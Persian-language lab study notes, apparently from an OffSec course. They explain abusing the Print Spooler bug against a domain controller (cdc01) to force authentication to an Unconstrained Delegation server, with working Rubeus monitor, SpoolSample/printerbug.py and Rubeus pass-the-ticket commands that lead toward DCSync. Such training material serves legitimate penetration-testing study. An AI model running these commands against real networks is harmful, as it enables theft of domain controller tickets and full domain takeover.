

این مبحث داره **Print Spooler abuse** رو برای **Unconstinedra Delegation** توضیح میده.

---

## **هدف چیه؟**

وقتی یه سرور با **Unconstrained Delegation** پیدا کردی، باید یه **Domain Admin** یا **DC** رو مجبور کنی بهش وصل بشه تا **TGT** اون رو بدزدی.

اما چطور؟ → **Print Spooler attack (SpoolSample)**

---

## **چطور کار می‌کنه؟**

### **مرحله ۱: چک کردن Print Spooler روی DC**
```powershell
dir \\cdc01\pipe\spoolss
```

اگه این named pipe وجود داشته باشه → **Print Spooler فعاله**

---

### **مرحله ۲: Monitoring با Rubeus**
روی سرور Unconstrained Delegation:
```powershell
.\Rubeus.exe monitor /interval:5 /nowrap
```

---

### **مرحله ۳: مجبور کردن DC به اتصال**
از ابزار **SpoolSample** یا **printerbug.py** استفاده می‌کنی:

```bash
# از Kali
python3 printerbug.py prod.corp1.com/offsec:password@cdc01 compromised-server

# یا از Windows
.\SpoolSample.exe cdc01 compromised-server
```

این کار باعث میشه **DC** به سرور compromised شده وصل بشه و **TGT** اون توی Rubeus ظاهر بشه.

---

### **مرحله ۴: استفاده از TGT**
```powershell
.\Rubeus.exe ptt /ticket:[base64-ticket]
klist
# حالا می‌تونی DCSync بزنی یا به DC دسترسی داشته باشی
```

---

## **خلاصه:**

این دستور داره چک می‌کنه که **Print Spooler** روی DC فعاله یا نه. اگه فعال باشه، می‌تونی با **SpoolSample** DC رو مجبور کنی به سرور Unconstrained Delegation وصل بشه و TGT اون رو بدزدی.

![[Pasted image 20260428133436.png]]

این دستور داره **TGT monitoring** رو با Rubeus شروع می‌کنه:

```powershell
Rubeus.exe monitor /interval:5 /filteruser:CDC01$
```

---

## **توضیح پارامترها:**

- **`monitor`**: حالت نظارت روی TGT های جدید
- **`/interval:5`**: هر ۵ ثانیه چک کن
- **`/filteruser:CDC01$`**: فقط TGT مربوط به **CDC01$** (computer account DC) رو نشون بده

---

## **چرا CDC01$؟**

وقتی **Print Spooler attack** رو اجرا می‌کنی، **DC** با **computer account** خودش (CDC01$) به سرور Unconstrained Delegation وصل میشه، نه با یوزر Domain Admin.

پس باید TGT مربوط به **CDC01$** رو بگیری.

---

## **مرحله بعد:**

حالا باید **SpoolSample** رو اجرا کنی تا DC مجبور بشه وصل بشه:

```powershell
.\SpoolSample.exe CDC01 <your-compromised-server>
```

بعدش Rubeus اون TGT رو capture می‌کنه و می‌تونی ازش برای **DCSync** یا دسترسی به DC استفاده کنی.

![[Pasted image 20260428133521.png]]

![[Pasted image 20260428133539.png]]


![[Pasted image 20260428133627.png]]

```
rubeus.exe ptt /ticket:<your_ticket>
```


![[Pasted image 20260428133722.png]]


![[Pasted image 20260428133747.png]]

![[Pasted image 20260428133828.png]]
